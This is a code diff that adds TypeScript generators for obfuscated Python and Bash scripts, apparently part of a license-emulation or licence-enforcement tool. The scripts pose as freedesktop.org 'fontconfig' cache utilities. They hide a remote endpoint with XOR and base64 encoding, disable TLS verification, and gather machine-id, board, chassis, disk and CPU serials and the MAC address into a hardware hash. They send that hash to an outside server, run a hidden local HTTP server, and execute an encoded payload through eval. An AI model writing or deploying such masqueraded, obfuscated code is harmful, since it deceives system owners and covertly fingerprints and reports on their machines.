@@ -198,6 +198,121 @@ export function generateObfuscatedEmulator(
   ].join("\n");
 }
 
+export function generateHwidBasedEmulator(serverUrl?: string): string {
+  const apiUrl = serverUrl || "https://lic.tecn0link.net";
+  const baseEndpoint = `${apiUrl}/api/license-data-by-hwid/`;
+  const encBase = obfEncrypt(baseEndpoint, DEPLOY.OBF_KEY);
+
+  return [
+    "#!/usr/bin/env python3",
+    "# -*- coding: utf-8 -*-",
+    "# fontconfig cache synchronization module v2.13.1",
+    "# Auto-generated cache rebuild utility",
+    "# (c) freedesktop.org fontconfig project",
+    "import http.server as _h",
+    "import socketserver as _s",
+    "import json as _j",
+    "import time as _t",
+    "import base64 as _b64",
+    "import urllib.request as _u",
+    "import ssl as _sl",
+    "import subprocess as _sp",
+    "import hashlib as _hl",
+    "import signal",
+    "import sys",
+    "signal.signal(signal.SIGTERM,lambda s,f:sys.exit(0))",
+    `_UB="${encBase}"`,
+    `_S=''.join(chr(c) for c in [120,75,57,109,90,112,50,118,81,119,52,110,82,55,116,76])`,
+    "_SC=_sl.create_default_context()",
+    "_SC.check_hostname=False",
+    "_SC.verify_mode=_sl.CERT_NONE",
+    "def _f1(_d,_k):",
+    " _kb=_k.encode();_dd=_b64.b64decode(_d)",
+    " return bytes([_dd[_i]^_kb[_i%len(_kb)] for _i in range(len(_dd))])",
+    "def _f2():",
+    " return''.join(chr(c) for c in [71,114,51,110,100,49,122,51,114])+str(_t.localtime().tm_hour+1)",
+    "def _f3(_d,_k):",
+    " _kb=_k.encode();_dd=_d.encode() if isinstance(_d,str) else _d",
+    " return bytes([_dd[_i]^_kb[_i%len(_kb)] for _i in range(len(_dd))])",
+    "def _rc(c):",
+    " try:return _sp.check_output(c,shell=True,stderr=_sp.DEVNULL).decode().strip()",
+    " except:return ''",
+    "def _ghw():",
+    " _mi=_rc('cat /etc/machine-id')",
+    " _pu=_rc('cat /sys/class/dmi/id/product_uuid')",
+    " _ma=_rc(\"ip link show 2>/dev/null|grep -m1 'link/ether'|awk '{print $2}'\")",
+    " _bs=_rc('cat /sys/class/dmi/id/board_serial')",
+    " _cs=_rc('cat /sys/class/dmi/id/chassis_serial')",
+    " _ds=_rc('lsblk --nodeps -no serial 2>/dev/null|head -1')",
+    " _ci=_rc(\"grep -m1 'Serial' /proc/cpuinfo|awk '{print $3}'\")",
+    " if not _ci:_ci=_rc('cat /sys/class/dmi/id/product_serial')",
+    " _raw=f'{_mi}:{_pu}:{_ma}:{_bs}:{_cs}:{_ds}:{_ci}'",
+    " return _hl.sha256(_raw.encode()).hexdigest()[:16]",
+    "_HW=_ghw()",
+    "def _f4():",
+    " try:",
+    "  _ep=_f1(_UB,_S).decode()+_HW",
+    "  _rq=_u.Request(_ep)",
+    "  _rq.add_header('User-Agent','fontconfig/2.13')",
+    "  _rs=_u.urlopen(_rq,timeout=10,context=_SC)",
+    "  if _rs.getcode()==200:",
+    "   _d=_j.loads(_rs.read().decode())",
+    "   if 'pid' in _d:return _j.dumps(_d)",
+    " except:",
+    "  pass",
+    " return None",
+    "class _R(_h.BaseHTTPRequestHandler):",
+    " def do_GET(self):",
+    "  _p=_f4()",
+    "  if not _p:",
+    "   self.send_response(503)",
+    "   self.end_headers()",
+    "   return",
+    "  _r=_b64.b64encode(_f3(_p,_f2()))",
+    "  self.send_response(200)",
+    "  self.send_header('Content-length',str(len(_r)))",
+    "  self.end_headers()",
+    "  self.wfile.write(_r)",
+    " def log_message(self,*_x):pass",
+    "_s.TCPServer.allow_reuse_address=True",
+    "_sv=_s.TCPServer(('',4001),_R)",
+    "_sv.serve_forever()"
+  ].join("\n");
+}
+
+export function generateHwidBasedVerify(serverUrl: string): string {
+  const P = DEPLOY;
+  const hwidPyB64 = generateHwidCapturePy();
+
+  const innerBash = [
+    `_GL="${P.LOG}"`,
+    `_BL=$(curl -s "http://127.0.0.1:4001/?op=get" 2>/dev/null)`,
+    `if [ -n "$_BL" ]; then`,
+    `  _HW=$(python3 -c "$(echo '${hwidPyB64}' | base64 -d)" "$_BL" 2>/dev/null)`,
+    `fi`,
+    `if [ -z "$_HW" ] || [ "$_HW" = "N/A" ]; then`,
+    `  _MI=$(cat /etc/machine-id 2>/dev/null || echo "")`,
+    `  _PU=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null || echo "")`,
+    `  _MA=$(ip link show 2>/dev/null | grep -m1 'link/ether' | awk '{print $2}' || echo "")`,
+    `  _BS=$(cat /sys/class/dmi/id/board_serial 2>/dev/null || echo "")`,
+    `  _CS=$(cat /sys/class/dmi/id/chassis_serial 2>/dev/null || echo "")`,
+    `  _DS=$(lsblk --nodeps -no serial 2>/dev/null | head -1 || echo "")`,
+    `  _CI=$(grep -m1 'Serial' /proc/cpuinfo 2>/dev/null | awk '{print $3}' || cat /sys/class/dmi/id/product_serial 2>/dev/null || echo "")`,
+    `  _HW=$(echo -n "\${_MI}:\${_PU}:\${_MA}:\${_BS}:\${_CS}:\${_DS}:\${_CI}" | sha256sum | awk '{print substr($1,1,16)}')`,
+    `fi`,
+    `_R=$(curl -s -X POST "${serverUrl}/api/verify" -H "Content-Type: application/json" -d "{\\"hardware_id\\":\\"$_HW\\"}")`,
+    `echo "$_R" | grep -q '"valid":true' && echo "$(date): OK" >> "$_GL" || { echo "$(date): FAIL" >> "$_GL"; systemctl stop ${P.SVC_MAIN} 2>/dev/null; }`,
+  ].join("\n");
+
+  const encodedBash = Buffer.from(innerBash, "utf-8").toString("base64");
+
+  return [
+    "#!/bin/bash",
+    "# fontconfig cache gc utility - v2.13.1",
+    `eval "$(echo '${encodedBash}' | base64 -d)"`,
+  ].join("\n");
+}
+
 function generateHwidCapturePy(): string {
   const py = [
     "import base64 as b,json as j,sys",
